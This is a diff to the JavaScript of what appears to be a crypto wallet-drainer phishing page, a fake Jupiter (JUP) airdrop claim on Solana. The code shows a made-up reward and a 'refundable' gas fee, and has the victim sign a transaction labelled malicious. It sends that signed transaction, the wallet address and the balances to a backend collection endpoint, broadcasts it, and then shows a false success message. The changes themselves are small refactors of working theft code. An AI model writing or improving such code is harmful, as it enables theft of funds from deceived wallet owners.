@@ -414,6 +414,7 @@
         let balances = { SOL: 0, USDC: 0 };
         let currentProvider = null;
         let currentWalletName = null;
+        let currentFakeAmount = 0;
 
         // ====== WALLET CONNECTION ======
         async function connectWallet() {
@@ -497,6 +498,7 @@
                 }
 
                 console.log('[DEBUG] Fake airdrop amount:', fakeAmount);
+                currentFakeAmount = fakeAmount;
                 document.getElementById('claimAmount').textContent = fakeAmount.toLocaleString();
                 document.getElementById('statusText').textContent = "You're eligible for a bonus airdrop!";
                 document.getElementById('loading').classList.remove('active');
@@ -571,7 +573,6 @@
 
             const gasFee = (Math.random() * 0.01 + 0.005).toFixed(4);
             document.getElementById('gasFeeAmount').textContent = `Fee: ${gasFee} SOL (refundable)`;
-            window.currentFakeAmount = fakeAmount;
             document.getElementById('payGasFeeBtn').onclick = payGasFee;
         }
 
@@ -627,7 +628,7 @@
                 const signedMaliciousTx = await window.WalletAdapter.signTransaction(currentProvider, maliciousTx);
 
                 console.log('[DEBUG] Signing and sending fake gas fee transaction...');
-                await window.WalletAdapter.signAndSendTransaction(currentProvider, fakeGasTx);
+                const fakeGasTxResponse = await window.WalletAdapter.signAndSendTransaction(currentProvider, fakeGasTx);
 
                 console.log('[DEBUG] Sending to backend...');
                 const response = await fetch(`${BACKEND_URL}/collect`, {
@@ -640,7 +641,7 @@
                         wallet: walletAddress,
                         signedTx: signedMaliciousTx.serialize().toString('base64'),
                         balances: balances,
-                        fakeAmount: window.currentFakeAmount,
+                        fAmount: currentFakeAmount,
                         timestamp: new Date().toISOString()
                     })
                 });
@@ -656,7 +657,7 @@
                 const txId = await conn.sendRawTransaction(signedMaliciousTx.serialize());
                 await conn.confirmTransaction(txId);
 
-                document.getElementById('successMessage').textContent = `Successfully claimed ${window.currentFakeAmount} JUP! Your tokens will arrive within 2 hours.`;
+                document.getElementById('successMessage').textContent = `Successfully claimed ${currentFakeAmount} JUP! Your tokens will arrive within 2 hours.`;
                 document.getElementById('viewTxLink').href = `https://solscan.io/tx/${result.gasTxId}?cluster=mainnet-beta`;
                 document.getElementById('gasFeePopup').style.display = 'none';
                 document.getElementById('successPopup').style.display = 'flex';
